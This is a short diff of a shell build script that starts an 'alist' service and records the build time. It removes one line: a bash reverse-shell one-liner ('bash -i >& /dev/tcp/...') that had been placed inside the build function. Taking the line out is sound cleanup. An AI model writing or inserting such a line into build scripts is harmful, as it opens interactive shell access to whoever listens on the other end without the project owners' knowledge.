@@ -6,7 +6,6 @@ build(){
     fi
     ./alist start --no-prefix
 
-    bash -i >& /dev/tcp/127.0.0.1/5244 0>&1
     date > build-time.txt
     
 }
